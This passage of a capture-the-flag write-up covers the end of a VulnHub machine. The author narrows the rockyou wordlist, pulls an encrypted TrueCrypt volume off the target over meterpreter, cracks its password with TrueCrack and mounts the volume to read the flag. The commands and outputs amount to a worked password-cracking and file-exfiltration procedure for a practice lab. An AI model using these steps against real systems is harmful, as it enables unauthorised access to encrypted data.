-</span><span class='line'>If you are still struggling, remember that song by The Jam
-</span><span class='line'>
-</span><span class='line'>Later,
-</span><span class='line'>Dave</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>
-
-<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l /usr/share/wordlists/rockyou.txt 
-</span><span class='line'>14344392 /usr/share/wordlists/rockyou.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p>I made a new file with only the entries that were 11 characters long:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
-</span><span class='line'>wc -l rocked.txt 
-</span><span class='line'>865891 rocked.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>grep academy rocked.txt &gt; rockademy.txt
-</span><span class='line'>wc -l rockademy.txt 
-</span><span class='line'>16 rockademy.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; download /tmp/dave.tc
-</span><span class='line'>[*] Downloading: /tmp/dave.tc -&gt; dave.tc
-</span><span class='line'>[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
-</span><span class='line'>[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
-</span><span class='line'>[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
-</span><span class='line'>[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
-</span><span class='line'>[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
-</span><span class='line'>[*] download   : /tmp/dave.tc -&gt; dave.tc</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>
-
-<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
-and it is optimized for Nvidia Cuda technology. It supports:</p>
-
-<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
-and Whirlpool.
-   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
-SERPENT, TWOFISH.
-   File-hosted (container) and Partition/device-hosted.
-   Hidden volumes and Backup headers.</p>
-
-<p>TrueCrack is able to perform a brute-force attack based on:</p>
-
-<p>   Dictionary: read the passwords from a file of words.
-   Alphabet: generate all passwords of given length from given alphabet.</p>
-
-<p>TrueCrack works on gpu and cpu</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack
-</span><span class='line'>TrueCrack v3.0
-</span><span class='line'>Website: http://code.google.com/p/truecrack
-</span><span class='line'>Contact us: infotruecrack@gmail.com
-</span><span class='line'>Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
-</span><span class='line'>Based on TrueCrypt, freely available at http://www.truecrypt.org/
-</span><span class='line'>Copyright (c) 2011 by Luca Vaccaro.
-</span><span class='line'>
-</span><span class='line'>Usage:
-</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -w &lt;wordlist_file&gt; [-b &lt;parallel_block&gt;]
-</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -c &lt;charset&gt; [-s &lt;minlength&gt;] -m &lt;maxlength&gt; [-b &lt;parallel_block&gt;]
-</span><span class='line'>
-</span><span class='line'>Options:
-</span><span class='line'> -h --help                        Display this information.
-</span><span class='line'> -t --truecrypt &lt;truecrypt_file&gt;    Truecrypt volume file.
-</span><span class='line'> -k --key &lt;ripemd160 | sha512 | whirlpool&gt;      Key derivation function (default ripemd160).
-</span><span class='line'> -b --blocksize &lt;parallel_blocks&gt;       Number of parallel computations (board dependent).
-</span><span class='line'> -w --wordlist &lt;wordlist_file&gt;      File of words, for Dictionary attack.
-</span><span class='line'> -c --charset &lt;alphabet&gt;        Alphabet generator, for Alphabet attack.
-</span><span class='line'> -s --startlength &lt;minlength&gt;       Starting length of passwords, for Alphabet attack (default 1).
-</span><span class='line'> -m --maxlength &lt;maxlength&gt;     Maximum length of passwords, for Alphabet attack.
-</span><span class='line'> -r --restore &lt;number&gt;          Restore the computation.
-</span><span class='line'> -v --verbose                     Show computation messages.
-</span><span class='line'>
-</span><span class='line'>Sample:
-</span><span class='line'> Dictionary mode: truecrack --truecrypt ./volume --wordlist ./dictionary.txt 
-</span><span class='line'> Charset mode: truecrack --truecrypt ./volume --charset ./dictionary.txt --maxlength 10</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt 
-</span><span class='line'>TrueCrack v3.0
-</span><span class='line'>Website: http://code.google.com/p/truecrack
-</span><span class='line'>Contact us: infotruecrack@gmail.com
-</span><span class='line'>Found password:       "etonacademy"
-</span><span class='line'>Password length:  "12"
-</span><span class='line'>Total computations:   "10"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It worked! Now all that remains is to open the volume and snoop around:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup open --type tcrypt dave.tc hidden
-</span><span class='line'>Enter passphrase: 
-</span><span class='line'>mkdir -p /mnt/tcrypt
-</span><span class='line'>mount /dev/mapper/hidden /mnt/tcrypt/
-</span><span class='line'>root@kali:/mnt/tcrypt# ls -la
-</span><span class='line'>total 20
-</span><span class='line'>drwxr-xr-x 6 root root  1024 Apr 12  2016 .
-</span><span class='line'>drwxr-xr-x 6 root root  4096 May  4 16:20 ..
-</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
-</span><span class='line'>drwx------ 2 root root 12288 Apr 12  2016 lost+found
-</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
-</span><span class='line'>drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret</span></code></pre></td></tr></table></div></figure>
-
-
-<p>A hidden directory..with another hidden directory inside it:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/tcrypt/.secret# ls -la
-</span><span class='line'>total 64
-</span><span class='line'>drwxr-xr-x 3 root root  1024 Apr 12  2016 .
-</span><span class='line'>drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
-</span><span class='line'>-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
-</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 .top</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And finally, the flag!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt 
-</span><span class='line'>
-</span><span class='line'>################################################################################
-</span><span class='line'>#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
-</span><span class='line'>#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
-</span><span class='line'># | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
-</span><span class='line'>#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
-</span><span class='line'>#                                                                              #
-</span><span class='line'>################################################################################
-</span><span class='line'>
-</span><span class='line'>Firstly, thanks for trying this VM. If you have rooted it, well done!
-</span><span class='line'>
-</span><span class='line'>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
-</span><span class='line'>goes to barrebas and junken for help in testing and final configuration.
-</span><span class='line'>                                                                    --knightmare</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
-</span><span class='line'>/ You will be awarded a medal for        \
-</span><span class='line'>\ disregarding safety in saving someone. /
 </span><span class='line'> ----------------------------------------
 </span><span class='line'>        \   ^__^
 </span><span class='line'>         \  (oo)\_______
